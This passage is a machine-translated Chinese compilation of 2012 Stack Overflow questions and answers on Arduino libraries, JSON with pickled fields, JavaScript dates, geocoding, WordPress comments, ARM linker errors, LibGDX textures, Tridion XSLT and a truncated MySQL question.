#include "Binary.h"

Binary::Binary(int pins[], int numPins) {
  _values = new boolean[numPins];
  _pins = pins;
  _numPins = numPins;

  for (int i = 0; i < _numPins; i ++) {
    pinMode(_pins[i], OUTPUT);
    _values[i] = false;
  }

  _update();
}

void Binary::_update() {
  for (int i = 0; i < _numPins; i ++) {
    if (_values[i]) {
      digitalWrite(_pins[i], HIGH);
    } else {
      digitalWrite(_pins[i], LOW);
    }
  }
}

void Binary::_setValues (int num) {
  for (int i = 0; i < _numPins; i ++, num/=2) {
    _values[i] = ((num%2)==1);
  }
}

void Binary::display (int number) {
  _setValues(number);
  _update();
}

void Binary::clear() {
  display(0);
} 
```

和 BinaryCounter.ino

```
#include <Binary.h>

int pins[] = {2,3,4,5,6};
int numPins = 5;

Binary dis(pins, numPins);

void setup() {
}

void loop() {  
  int loopEnd = 1<<numPins;
  for (int i = 0; i < loopEnd; i ++) {
    dis.display(i);
    delay(200);
  }
} 
```

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-06-12T06:57:59.727

更改`<Binary.h>`为文件 BinaryCounter 中的引号`"Binary.h"`。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-19T20:09:30.800

.cpp 和 .h 是否在 library/BinaryCounter/ 目录中？您是否创建了keywords.txt 文件？

# python - python如何解析从phpmyadmin导出的json文件

> ID：10991318
> 
> 赞同：0
> 
> 时间：2012-06-12T06:06:58.130
> 
> 标签：python, json, phpmyadmin

我有一个从 phpmyadmin 导出的 json 文件，它看起来像这样（utf-8 文件）：

```
[{"user_email": "bh549@sina.cn","followee_id": 1411833182,"create_date": "cdatetime datetime p1 (S\'\\x07\\xdb\\x06\\x13\\x16\\x08(\\r\\xd5\\xcc\' tRp2 ."}, {"user_email": "zaici4@sina.cn","followee_id": 1296426000,"create_date": "cdatetime datetime p1 (S\'\\x07\\xdb\\x07\\x14\\x179\\x16\\x02 \\x08\' tRp2 ."}, {"user_email": "yanaa357@sina.com","followee_id": 1848085255,"create_date": "cdatetime datetime p1 (S\'\\x07\\xdb\\x08\\x13\\x17\\x10\\x0f\\x05\\x1c\\x02\' tRp2 ."}] 
```

每个 dict 是数据库中的一行，每行中的第三个值是一个 cpickled 字符串。

然后我使用表单将此文件上传到 python 脚本（使用 post 方法）。

然后在 python 脚本中解析这个文件，如下所示：

```
 import cgi, os
    import cgitb; cgitb.enable()
    import json
    #import simplejson as json
    print "Content-type: text/html\n\n"
    try:
        import msvcrt
        msvcrt.setmode (0, os.O_BINARY) # stdin = 0
        msvcrt.setmode (1, os.O_BINARY) # stdout = 1
    except ImportError:
        pass

    form = cgi.FieldStorage()

    file_content = form['mysql_table'].value
    file_content = json.loads(file_content) 
```

然后浏览器在执行 json.loads 时打印一个值错误：

`<type 'exceptions.ValueError'>: Invalid control character at: line 1 column 83 (char 83)`

char 83 是第一行第三个值中的空格。

如何解决这个问题？

不管怎样，谢谢mhawke。但是你说的第一个问题不存在。没有 \n 因为我从打印结果中复制了它，在我导出的 json 文件中，它实际上有 \n

```
{"user_email": "bh549@sina.cn","followee_id": 1411833182,"create_date": "cdatetime
datetime
p1
(S\'\\x07\\xdb\\x06\\x13\\x16\\x08(\\r\\xd5\\xcc\'
tRp2
."}, {"user_email": "zaici4@sina.cn","followee_id": 1296426000,"create_date": "cdatetime
datetime
p1
(S\'\\x07\\xdb\\x07\\x14\\x179\\x16\\x02 \\x08\'
tRp2
."} 
```

我是不是误会了？第二个问题，是phpmyadmin在导出时转义了文件，那你说的问题怎么解决？

**slouton：**我正在编写一个 python 脚本来导出表并转换腌制数据。它现在工作了，现在似乎是用腌制数据处理 json 的方法。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-15T03:41:24.807

换行符在 JSON 中的字符串中**无效**，如果 phpMyAdmin 正在生成它们，那么您应该在项目中记录一个错误。

```
>>> json.loads('"123"')
u'123'
>>> json.loads('"123\n456"')
Traceback (most recent call last):
  File "<stdin>", line 1, in <module>
  File "/usr/lib64/python2.7/json/__init__.py", line 326, in loads
    return _default_decoder.decode(s)
  File "/usr/lib64/python2.7/json/decoder.py", line 366, in decode
    obj, end = self.raw_decode(s, idx=_w(s, 0).end())
  File "/usr/lib64/python2.7/json/decoder.py", line 382, in raw_decode
    obj, end = self.scan_once(s, idx)
ValueError: Invalid control character at: line 1 column 4 (char 4) 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-06-12T07:37:32.483

JSON 不支持像`\x07`. 您必须改用 unicode 转义符 ( `\u0007`)。在解码之前尝试将一种形式转换为另一种形式：

```
content = content.replace('\\x', '\\u00') 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-06-13T03:31:18.790

有几个问题。

首先是泡菜似乎无效（我认为）。它在各个组件之间缺少换行符。例如

```
import cPickle
bad_pickle = "cdatetime datetime p1 (S\'\\x07\\xdb\\x06\\x13\\x16\\x08(\\r\\xd5\\xcc\' tRp2 ."
good_pickle = '\n'.join(bad_pickle.split())

>>> cPickle.loads(bad_pickle)
Traceback (most recent call last):
  File "<stdin>", line 1, in <module>
cPickle.UnpicklingError: pickle data was truncated

>>> cPickle.loads(good_pickle)
datetime.datetime(2011, 6, 19, 22, 8, 40, 906700) 
```

第二个问题是你需要`\`用另一个`\`. 您可以使用 轻松做到这一点`replace`，例如`replace('\\', '\\\\')`

此代码显示往返 JSON 编码和解码，包括腌制对象：

```
import json, cPickle
from datetime import datetime

pickled_datetime = cPickle.dumps(datetime.now())
d = {"user_email": "bh549@sina.cn",
     "followee_id": 1411833182,
     "create_date": pickled_datetime }
j = json.dumps(d)

>>> d
{'create_date': "cdatetime\ndatetime\np1\n(S'\\x07\\xdc\\x06\\r\\x0c\\x16:\\x06/\\x85'\ntRp2\n.", 'followee_id': 1411833182, 'user_email': 'bh549@sina.cn'}
>>> j
'{"create_date": "cdatetime\\ndatetime\\np1\\n(S\'\\\\x07\\\\xdc\\\\x06\\\\r\\\\x0c\\\\x16:\\\\x06/\\\\x85\'\\ntRp2\\n.", "followee_id": 1411833182, "user_email": "bh549@sina.cn"}' 
```

注意反斜杠是如何`j`被一个额外的反斜杠转义的。这就是来自数据库的泡菜的样子。解码存储的 JSON 数据`j`如下：

```
d2 = json.loads(j)
cPickle.loads(d2['create_date'])

>>> d2
{'followee_id': 1411833182, 'create_date': "cdatetime\ndatetime\np1\n(S'\\x07\\xdc\\x06\\r\\x0c\\x16:\\x06/\\x85'\ntRp2\n.", 'user_email': 'bh549@sina.cn'}
>>> cPickle.loads(d2['create_date'])
datetime.datetime(2012, 6, 13, 12, 22, 58, 405381) 
```

# javascript - 如何从字符串构造 javascript Date 对象

> ID：10991324
> 
> 赞同：1
> 
> 时间：2012-06-12T06:07:52.443
> 
> 标签：javascript

我有字符串格式的日期值“06/12/2012”。如何构造 Javascript Date 对象，以便可以在比较之前/之后执行？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-06-12T06:50:19.817

将字符串转换为日期对象的唯一可靠方法是解析它。您必须事先知道格式。字符串“06/12/2012”不符合任何正式标准，但最有可能是日/月/年，因此：

```
// Convert string in d/m/y format to a Date object
function toDate(s) {
  var bits = s.split('/');
  return new Date(bits[2],--bits[1],bits[0]);
} 
```

请注意，必须告知任何日期解析函数格式和（通常）分隔符，因为猜测格式极易出错。

不要将字符串传递给任何浏览器 Date 对象并依赖主机正确解释它，浏览器可能识别的唯一格式是 ISO8601 格式，即使这样，很多人也会出错。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-06-12T06:09:57.403

```
var d = new Date("06/12/2012"); 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-06-12T06:12:59.220

```
var date = new Date("06/12/2012"),
    other = new Date("03/12/2012");

(date - other > 0? alert("after") : alert("before"); 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-06-12T06:10:02.083

我认为这可以帮助你[http://www.mattkruse.com/javascript/date/](http://www.mattkruse.com/javascript/date/)

有一个`getDateFromFormat()`功能可以稍微调整一下来解决您的问题。

# google-cloud-datastore - 谷歌应用引擎用户服务

> ID：10991329
> 
> 赞同：0
> 
> 时间：2012-06-12T06:09:02.723
> 
> 标签：google-cloud-datastore

大家好。我使用 Google App Engine 数据存储区 java 创建了一个简单的数据存储区。所有用户登录后都可以看到相同的数据，如何确保每个用户登录后只能访问自己的数据？

请，任何教程网站也将不胜感激。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-12T20:12:30.277

哪个用户可以访问哪些数据完全取决于您处理 Web 请求、与数据存储对话并输出 HTML 响应的应用程序代码。如果您发布有关您的应用程序的更多细节，我会更有帮助。

GAE 文档很有帮助：[https ://developers.google.com/appengine/docs/java/overview](https://developers.google.com/appengine/docs/java/overview)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-08-06T14:24:38.870

当用户通过 Gmail 登录时，我对此问题的解决方案很感兴趣，使用`UserService`.

# google-maps - Google 地理编码器如何工作？

> ID：10991330
> 
> 赞同：16
> 
> 时间：2012-06-12T06:09:08.657
> 
> 标签：google-maps, geocoding, google-geocoder

我很好奇 Google 地理编码器的工作原理。

我一直在研究一些开源地理编码器的实现，比如[geocommons 的 geocoder](https://github.com/geocommons/geocoder)或[PostGIS 的新 Tiger Geocoder](http://svn.osgeo.org/postgis/trunk/extras/tiger_geocoder/)。到目前为止，这大致是我所知道的（希望能证明我一直在做功课）：

我意识到开源地理编码器的核心包含三个主要元素。

1.- 一个**地址规范化器**，它采用任意字符串并将其规范化（[以此处为例](http://svn.osgeo.org/postgis/trunk/extras/tiger_geocoder/README)）：

```
normalize_address('address string');

e.g.: SELECT naddy.* FROM normalize_address('29645 7th Street SW Federal Way 98023') AS naddy;

 address | predirabbrev |      streetname       | streettypeabbrev | postdirabbrev | internal | location | stateabbrev |  zip  | parsed
 ---------+-------------+-----------------------+------------------+---------------+----------+----------+-------------+-------+--------
 29645 |               | 7th Street SW Federal  | Way              |               |          |          |             | 98023 | 
```

和：

2.- 一个地理编码器，它对核心算法是[Levenshtein Distance](http://en.wikipedia.org/wiki/Levenshtein_distance)的名称进行一些神奇的模糊匹配。

一个很好的例子是维基百科文章中的一个，它计算了单词 kitten 和 sit 之间的 Levenshtein 距离（距离为 3，因为这是将一个字符串更改为另一个字符串所需的编辑次数）：

```
kitten → sitten (substitution of 's' for 'k')
sitten → sittin (substitution of 'i' for 'e')
sittin → sitting (insertion of 'g' at the end). 
```

3.- 在最后对街道段进行一些插值，以猜测房子在哪里。我下载了一大块免费的[Census Tiger 街道数据集](http://www.census.gov/geo/www/tiger/tgrshp2011/tgrshp2011.html)来创建这个示例。

![街道插值示例](../Images/4e2b2c429c083636914156d51d32ea7b.png)

在上面的示例中，感兴趣的街道段 (Schaeffer Hills Dr) 有一个从 300 开始的*from 节点*（所以 300 Schaeffer Hills Dr）和一个在 400 结束的*to 节点*（400 Schaeffer Hills Drv）。如果我匹配到这个 Schaeffer Hills Drv，并且请求是针对 310 号街道，那么算法只会将其[插入](http://en.wikipedia.org/wiki/Interpolation)（遍历其中的 10%）到我的绿色箭头所在的位置。

这就是开源地理编码器工具的作用。尽管如此，谷歌显然比这更聪明，并使用各种非传统的提示。

怎么会这样？

例如，我可以输入[680 Mission st](https://maps.google.com/maps?q=680%20Mission%20st)（没有城市、州、县，什么都没有）。大多数标准地址规范器会因为找到太多匹配项而崩溃。但是因为我在旧金山，我**猜**谷歌使用我的 ip 来获取一些[类似 geoip 的信息](http://www.maxmind.com/app/city)，通过一些模糊搜索做[一些扩展边界](http://en.wikipedia.org/wiki/Minimum_bounding_rectangle)作为提示，然后立即找到匹配的最接近的段并告诉我这是我的答案（哪个是对的！）。

除了我上面描述的技术之外，我正在寻找可以更清楚地了解 Google 地理编码器如何工作的答案。

**更新：**

好的，到目前为止，我们列出了两种提示

*   Geoip 作为提示
*   感兴趣区域边界框（参见 Paul 的示例）。
*   其他的？

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-06-12T21:19:35.250

通过戳黑盒子可以发现的一件事是 Google 地理编码器对令牌的顺序并不完全敏感（没有强制执行街道/城市/州/国家/地区的期望，尽管当你遵循时它会更好那）。这对我说，他们可能会将所有内容转储到某种全文搜索中，然后查看返回的内容。或者也许不是。尝试搜索“sault saint marie adams 200”和“sault saint marie adams 200”。

关于您的任务示例，这是一个很棒的示例，因为您可以看到地图提示直接发挥作用：

![使用欧洲地图窗口查询：欧洲结果。](../Images/17ae2585d7f329146803af4379ab63ca.png)

使用欧洲地图窗口查询：欧洲结果

![使用北美地图窗口查询：美国结果。](../Images/62ad7515c1b5f45623d0bd7051f1c6e9.png)

使用北美地图窗口查询：美国结果

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-06-12T06:17:53.967

还有另一个数据来源：县财产地图。这些不仅包括道路，还包括财产线（及其街道地址）。您经常可以在 Google 的地图上看到这一点，它实际上会显示分隔相邻属性的微弱线条。有时他们甚至勾勒出建筑物（县地图通常也包括这些）。

您也可以进行反向查找，因为您的 GPS 坐标查找您的确切地址可以像 2D 查询一样简单，以查找您所在的属性多边形。当我远离道路时，我已经看到这个工作正常但是仍在物业内，尽管手机离另一条街道更近，但它仍返回了正确的街道地址。

请注意，这些地图往往是公开的，有些县甚至有自己的在线界面。您甚至可以查找谁拥有特定地块。

# jasper-reports - 在 JasperReports Server 中创建仪表板

> ID：10991333
> 
> 赞同：3
> 
> 时间：2012-06-12T06:09:28.120
> 
> 标签：jasper-reports, reporting, dashboard, jasperserver

我是*JasperReports Server*的新手。我创建了两个报告，称为摘要和详细报告。摘要报告是饼图，详细报告是条形图。

当我单击摘要报告中的一个切片时，会相应地显示详细报告。我的要求是必须使用上述报告创建仪表板。在仪表板中，当我单击饼图切片时，应更新详细报告。谁能解释如何实现上述要求？

提前致谢。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-06-12T21:11:29.657

我做了一个关于这类事情的 Jaspersoft 演示。您可以在[网络研讨会存档](http://www.jaspersoft.com/resources/webinars)中找到它。它被称为“使用 Jaspersoft 构建交互式仪表板”。

您可以直接访问[JasperForge.org 论坛](http://jasperforge.org/plugins/espforum/view.php?group_id=112&forumid=102&topicid=85369)上的示例材料。

# php - 用于自定义主题的 Wordpress wp_enqueue_script('comment-reply')

> ID：10991336
> 
> 赞同：1
> 
> 时间：2012-06-12T06:09:54.633
> 
> 标签：php, html, wordpress

我一直在关注本[教程](https://www.problogdesign.com/wordpress/advanced-wordpress-comment-styles-and-tricks/) ，但无法让我的回复使用`wp_enqueue_script( 'comment-reply' );`php 函数按预期工作。

*   [函数.php PasteBin](http://pastebin.com/dJR6f6t9)
*   [header.php PasteBin](http://pastebin.com/dJR6f6t9)
*   [single.php PasteBin](http://pastebin.com/RfEZ0ELQ)
*   [评论.php PasteBin](https://web.archive.org/web/20120818030030/http://pastebin.com:80/4N3rfsJY)
*   页脚： `</body> </html> <!-- Footer Sections -->`

我已经删除了我认为与我希望完成的事情无关的代码。

**预期输出（取自 211 1.3*减去样式表*）**

[![预期产出](../Images/3af24294c71962c626e8b282738f7ddf.png)](https://i.stack.imgur.com/mSBc3.png)
[（来源：[iforce.co.nz](http://iforce.co.nz/i/n3cvsots.tjn.png)）]

**实际输出（取自我的主题*减去样式表*）**

[![实际输出](../Images/0b833e11561959de946caa703834737c.png)](https://i.stack.imgur.com/SghVB.png)
[（来源：[iforce.co.nz](http://iforce.co.nz/i/w3x4u4q0.3w4.png)）]

如何根据本[教程](https://www.problogdesign.com/wordpress/advanced-wordpress-comment-styles-and-tricks/)的高级评论完成**预期输出？**我应该用我的functions.php和single.php做什么来完成它？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-06-13T06:39:57.903

解决方案实际上非常简单......在阅读了 javascript 的 wordpress 代码之后。我发现问题在于如何创建每个评论块。

基于function.php中的这个函数

```
//this function will be called in the next section
function advanced_comment($comment, $args, $depth) {
$GLOBALS['comment'] = $comment; 
$PostAuthor = false;
if($comment->comment_author_email == get_the_author_email()) {
$PostAuthor = true;}
elseif($comment->comment_author_email == 'mordauk@gmail.com') {
$PostAuthor = true;} ?>
<li <?php if($PostAuthor) {echo "class='authorcomment' ";} ?>
<?php comment_class(); ?> id="li-comment-<?php comment_ID() ?>">
<div class="comment-author vcard">
<?php echo get_avatar($comment, $size='48',$default='<path_to_url>' ); ?>
<div class="comment-meta"<a href="<?php the_author_meta( 'user_url'); ?>"><?php printf(__('%s'), get_comment_author_link()) ?></a></div>
<small><?php printf(__('%1$s at %2$s'), get_comment_date(),  get_comment_time()) ?><?php edit_comment_link(__('(Edit)'),'  ','') ?></small>
</div>
<?php if ($comment->comment_approved == '0') : ?>
<div id="moderation"><?php _e('Your comment is awaiting moderation.') ?></div>
          <?php endif; ?><br />
        <div class="comment-text">  
          <?php comment_text() ?>
        </div>
          <div class="reply">
             <?php comment_reply_link(array_merge($args, array('depth' => $depth, 'max_depth' => $args['max_depth'])), $comment->comment_ID) ?>
             <?php delete_comment_link(get_comment_ID()); ?>
          </div>
  <div class="clear"></div>
      <?php } ?> 
```

我发现错误在于

```
<?php comment_class(); ?> id="li-comment-<?php comment_ID() ?>"> 
```

通过简单地删除 id 中的“li-”，使其形成 id="comment-"

回复表单现在继续回复。

# arm - 手臂霓虹灯代码上的链接器错误

> ID：10991337
> 
> 赞同：1
> 
> 时间：2012-06-12T06:09:56.250
> 
> 标签：arm, neon, sbrk

我正在使用 c 内在函数处理 ARM neon 代码。当我编译文件时，我不断收到以下错误：

> c:/program files (x86)/codesourcery/sourcery g++ lite/bin/../lib/gcc/arm-none-ea bi/4.3.3/../../../../arm-none -eabi/bin/ld.exe：警告：找不到入口符号_start；默认为 00008020
> 
> c:/program files (x86)/codesourcery/sourcery g++ lite/bin/../lib/gcc/arm-none-ea bi/4.3.3/../../../../arm-none -eabi/lib\libc.a(lib_a-exit.o)：在函数“exit”中：exit.c:(.text+0x28)：未定义对“_exit”的引用
> 
> c:/program files (x86)/codesourcery/sourcery g++ lite/bin/../lib/gcc/arm-none-ea bi/4.3.3/../../../../arm-none -eabi/lib\libc.a(lib_a-fstatr.o)：在函数“_fst at_r”中：fstatr.c:(.text+0x1c)：未定义对“_fstat”的引用
> 
> c:/program files (x86)/codesourcery/sourcery g++ lite/bin/../lib/gcc/arm-none-ea bi/4.3.3/../../../../arm-none -eabi/lib\libc.a(lib_a-openr.o)：在函数“_open _r”中：openr.c:(.text+0x20)：未定义对“_open”的引用
> 
> c:/program files (x86)/codesourcery/sourcery g++ lite/bin/../lib/gcc/arm-none-ea bi/4.3.3/../../../../arm-none -eabi/lib\libc.a(lib_a-sbrkr.o)：在函数'_sbrk _r'中：sbrkr.c:(.text+0x18)：未定义引用'_sbrk'
> 
> c:/program files (x86)/codesourcery/sourcery g++ lite/bin/../lib/gcc/arm-none-ea bi/4.3.3/../../../../arm-none -eabi/lib\libc.a(lib_a-writer.o): 在函数'_write_r':writer.c:(.text+0x20): 未定义引用'_write'
> 
> c:/program files (x86)/codesourcery/sourcery g++ lite/bin/../lib/gcc/arm-none-ea bi/4.3.3/../../../../arm-none -eabi/lib\libc.a(lib_a-closer.o)：在函数“_close_r”中：closer.c:(.text+0x18)：未定义对“_close”的引用
> 
> c:/program files (x86)/codesourcery/sourcery g++ lite/bin/../lib/gcc/arm-none-ea bi/4.3.3/../../../../arm-none -eabi/lib\libc.a(lib_a-isattyr.o): 在函数'_is atty_r':isattyr.c:(.text+0x18): 未定义引用'_isatty'
> 
> c:/program files (x86)/codesourcery/sourcery g++ lite/bin/../lib/gcc/arm-none-ea bi/4.3.3/../../../../arm-none -eabi/lib\libc.a(lib_a-lseekr.o): 在函数 '_lse ek_r':lseekr.c:(.text+0x20): 未定义引用'_lseek'
> 
> c:/program files (x86)/codesourcery/sourcery g++ lite/bin/../lib/gcc/arm-none-ea bi/4.3.3/../../../../arm-none -eabi/lib\libc.a(lib_a-readr.o): 在函数 '_read _r':readr.c:(.text+0x20): 未定义引用 '_read'
> 
> collect2: ld 返回 1 个退出状态

谁能告诉我如何纠正这些错误？我所知道的是我必须明确定义函数`isatty()`等`fstat`。但我不知道在哪里定义它们

# 8051 - 使用 FX2 微控制器访问外部 RAM 的示例代码

> ID：10991338
> 
> 赞同：0
> 
> 时间：2012-06-12T06:09:57.663
> 
> 标签：8051

我在使用赛普拉斯 FX2 微控制器访问外部 RAM 时遇到问题。谁能告诉我应该使用什么寄存器。就像 8051 MCU 一样，它具有用于地址总线的 A15-A0 引脚和用于数据总线的 D7-D0 引脚芯片选择、输出启用和写入启用选通。MCU 是 CY7C68013A FX2。我似乎找不到必须使用哪个寄存器来生成访问外部 RAM 的信号。使用该功能的寄存器应与8051相同。在微控制器中它有一个专用引脚即A15（地址总线MSB），D7（数据总线MSB）

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-19T07:41:26.343

`XRAM`您可以使用 16 位`DPTR`寄存器访问外部 RAM - 简称：

```
; write   register A value to XRAM address  indicated by DPTR
MOVX  @DPTR,A

; read XRAM to register A
MOVX  A,@DPTR 
```

# java - 来自 LibGDX 中的 texturepacker 的纹理

> ID：10991341
> 
> 赞同：4
> 
> 时间：2012-06-12T06:10:20.603
> 
> 标签：java, android, textures, libgdx, texturepacker

尝试了解（很棒的）LibGDX 框架中的纹理包装器，我需要帮助。

我想绑定从带有 TexturePacker 的 TextureAtlas 中提取的纹理（根据[Mesh, Color & Texture ）。](https://github.com/libgdx/libgdx/wiki/Mesh%2C-color-%26-texture)纹理绑定到矩形网格。

我希望基本上从打包文件中提取纹理（纹理实例）。

使用 createsprite 或 findregion 方法并以某种方式跳过文件句柄步骤是否可行？

另外：将上述方法与 AssetManager 结合使用时，有什么特别需要注意的吗？

谢谢你帮我整理！

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2012-06-12T16:42:40.437

### 创建纹理区域

首先，`TextureAtlas`通过指向描述图集的文本文件创建一个对象（创建图集的工具将创建两个文件：一个图像和一个描述其内容的文本文件）：

```
TextureAtlas myTextures = new TextureAtlas("images/packed.txt"); 
```

然后你可以在那个图集中查找一个`TextureRegion`（即图集中的特定子纹理）。该区域应该具有所使用的原始文件的基本名称（如果您遵循一些特殊的命名约定来创建纹理元素数组，则会有更多详细信息和选项，但暂时不要这样做）：

```
TextureRegion region = myTextures.findRegion(fname); 
```

### 配置纹理网格

要在网格上绘制此纹理区域，您需要`Mesh`使用对纹理坐标的支持来初始化：

```
Mesh myMesh = new Mesh(...,
                       new VertexAttribute(Usage.TextureCoordinates, 2, "y")); 
```

告诉 libGDX这个`new VertexAttribute(Usage.TextureCoordinates, 2, ...)`网格每个顶点将有两个纹理坐标（传统上，这两个纹理坐标称为`u`和`v`）。每个顶点可以有一堆不同的属性，但我假设唯一的其他属性是`Usage.Position`x,y,z 空间坐标的 3 值。

现在，在定义网格的浮点数组（传递给的数组`setVertices`）中，您需要为每个顶点设置 x、y 和 z 空间坐标加上 u 和 v 纹理坐标：

```
final int floatsPerVertex = 5; // 3 spatial +  2 texture
float[] meshData = new float[numVerticies * floatsPerVertex];
for (int i = 0; i < numVerticies; i++) {
   meshData[(i * floatsPerVertex) + 0] = ... ; // x coordinate of i'th vertex
   meshData[(i * floatsPerVertex) + 1] = ... ; // y coordinate of i'th vertex
   meshData[(i * floatsPerVertex) + 2] = ... ; // z coordinate of i'th vertex
   meshData[(i * floatsPerVertex) + 3] = ... ; // u texture coordinate of i'th vertex
   meshData[(i * floatsPerVertex) + 4] = ... ; // v texture coordinate of i'th vertex
}
myMesh.setVertices(meshData); 
```

您可以使用、、和方法计算特定的`u`和。请注意，纹理坐标的原点 (u1, v1) 在左上角，y 轴指向“下”（OpenGL 中的屏幕和空间坐标通常原点在左下角，y 轴指向“向上”）。它有点复杂，但非常灵活，因为您可以在纹理映射到网格时翻转、拉伸或扭曲纹理。`v`[`TextureRegion`](http://libgdx.l33tlabs.org/docs/api/com/badlogic/gdx/graphics/g2d/TextureRegion.html)`getU``getV``getU2``getV2`

由于纹理很大（比如 512x512）并且特定区域是其中的一小部分（比如 128x128 处的 20x20），因此您实际上最终会给出仅使用整个 512x512 图像的 20x20 子集的网格纹理坐标。

### 渲染纹理网格

最后，渲染时需要绑定图像，并在渲染前启用纹理：

```
region.getTexture().bind();
Gdx.graphics.getGL10().glEnable(GL10.GL_TEXTURE_2D);
myMesh.render();
Gdx.graphics.getGL10().glDisable(GL10.GL_TEXTURE_2D); 
```

请注意，这比应有的效率要低得多。纹理图集的部分好处是它应该包含许多可以一起渲染的区域，因此您只需绑定一个纹理，然后从该绑定纹理渲染许多不同的纹理网格。

`SpriteBatch`支持[用 a 定义的精灵`TextureRegion`](http://libgdx.l33tlabs.org/docs/api/com/badlogic/gdx/graphics/g2d/Sprite.html#Sprite%28com.badlogic.gdx.graphics.g2d.TextureRegion%29)，`AssetManager`支持加载和查找 a`TextureAtlas`作为第一类元素。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-06-30T12:46:34.977

使用上面的解释让它工作。

我不敢相信很少有人跑来问这个问题，因为这似乎是其他人想做的事情。

从接受的解决方案中，我创建了一个函数，该函数也为新的 UV 位置进行数学运算。

经过测试，它对我有用，但请查看，因为我不是 Java 开发人员。

```
public Mesh RebuildMeshUVtoTextureRegion(Mesh ObjectMesh, TextureRegion UVMapPos)
{
    int numFloats = ObjectMesh.getNumVertices() * ObjectMesh.getVertexSize() / 4;
    float[] vertices = new float[numFloats];
    ObjectMesh.getVertices(vertices);

    int numIndices = ObjectMesh.getNumIndices();
    short SourceIndices[] = new short[numIndices];
    ObjectMesh.getIndices(SourceIndices);

    final int floatsPerVertex = 5;
    int TimesToLoop = ((vertices.length) /floatsPerVertex); 

    float previousU;
    float previousV;

    float FullMapHeight = UVMapPos.getTexture().getHeight();
    float FullMapWidth  = UVMapPos.getTexture().getWidth();
    float NewMapWidth = UVMapPos.getRegionWidth();
    float NewMapHeight = UVMapPos.getRegionHeight();

    float FullMapUPercent;
    float FullMapVPercent;

    for (int i = 0; i < TimesToLoop; i++) 
    {   
        previousU = (vertices[(i * floatsPerVertex) + 3]);
        previousV = (vertices[(i * floatsPerVertex) + 4]);
        FullMapUPercent = previousU / FullMapWidth;
        FullMapVPercent = previousV / FullMapHeight;
        vertices[(i * floatsPerVertex) + 3] = (NewMapWidth * FullMapUPercent) + UVMapPos.getU(); //New U
        vertices[(i * floatsPerVertex) + 4] = (NewMapHeight * FullMapVPercent) + UVMapPos.getV();//New V
    }

    ObjectMesh.setVertices(vertices);
    ObjectMesh.setIndices(SourceIndices);

    return ObjectMesh;
} 
```

# xslt - 如何使用一个xslt在tridion中实现组件链接转换为多个xml后拆分输入xml

> ID：10991344
> 
> 赞同：0
> 
> 时间：2012-06-12T06:10:31.700
> 
> 标签：xslt, tridion

假设输入xml如图所示

```
 <Content>
             <ab>xxxx</ab>
             <bc>yyyyyy</bc>
             <ca>uuuuuuu</ca>
         </Content> 
```

转换后的输出 xml 文件是

```
 <Content>
             <aaa>xxxx</aaa>
             <bbb>yyyyyy</bbb>
             <ccc>uuuuuuu</ccc>
           </Content> 
```

但我希望将输入 xml 文件转换为 tridion 组件的源，以便生成的文件看起来像具有多个组件链接的组件，如下面的输出 xml：

```
 <Content>
   <A  xlink:href="/webdavURL/message/aaa.xml" ></A>
   <B xlink:href="/webdavURL/message/bbb.xml" ></B>
   <C  xlink:href="/webdavURL/message/ccc.xml" ></C>
      <Content> 
```

其中 A、B、C 是已经从通过将转换后的输入 xml 文件拆分为多个 xml 文件而形成的文件创建的单独组件。

组件 A 的来源：文件名应该是转换后的标签名称，如 aaa.xml

```
 <Content>
       <aaa>xxxx</aaa>
        </Content> 
```

这里的“aaa”是从输入 xml 转换的相应“ab”标签的标签名。

组件 B 的源：文件名应该是转换后的标签名称，如 bbb.xml

```
 <Content>
       <bbb>yyyyyy</bbb>
        </Content> 
```

这里的“bbb”是从输入 xml 转换的相应“bc”标签的标签名。

组件 C 的源：文件名应该是转换后的标签名，如 ccc.xml

```
 <Content>
       <ccc>uuuuuuu</ccc>
        </Content> 
```

这里的“ccc”是从输入 xml 转换的相应“ca”标签的标签名。

所以我只需要一个 XSLT，它将输入 xml 转换为 tridion 组件链接格式，并将输入 xml 中的每个标签转换为它并将其存储在相应的文件下，文件名作为转换后的标签名。有人可以帮帮我。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-12T11:32:01.893

您的实施似乎完全是在重新发明轮子 - 您是否有理由不能使用 SDL Tridion 提供的标准组件链接功能？假设您有 3 个具有以下 URI 的目标组件：

1.  目标 A (tcm:1-1)
2.  目标 B (tcm:1-2)
3.  目标 C (tcm:1-3)

并且您有一些源组件 XML，在带有指向 3 个项目的链接的 RTF 字段或 3 个单独的组件链接字段中，您将拥有类似于此的 XML 源：

```
<Content>
    <aaa xlink:href="tcm:1-1" xlink:title="Target A">Some text</aaa>
    <bbb xlink:href="tcm:1-2" xlink:title="Target B">Some text</bbb>
    <ccc xlink:href="tcm:1-3" xlink:title="Target C">Some text</ccc>
</Content> 
```

然后，您的 XSLT 需要做的就是使用 nXSLT 中介器将 Source XML 转换为以下内容：

```
<body>
    <a tridion:href="tcm:1-1" title="Target A">Some text</a>
    <a tridion:href="tcm:1-2" title="Target B">Some text</a>
    <a tridion:href="tcm:1-3" title="Target C">Some text</a>
</body> 
```

然后应用默认 TBB 将这些链接转换为动态链接引用，当页面加载时，链接将被解析为您想要的路径。

如果这没有帮助，请考虑重新编写您的问题，以便我们了解您实际想要实现的目标。

# mysql - 根据 where 子句更改表字段

> ID：10991345
> 
> 赞同：0
> 
> 时间：2012-06-12T06:10:35.673
> 
> 标签：mysql

我需要根据查询更改一些字段：

```
SELECT *
FROM  IP_cases_prelim
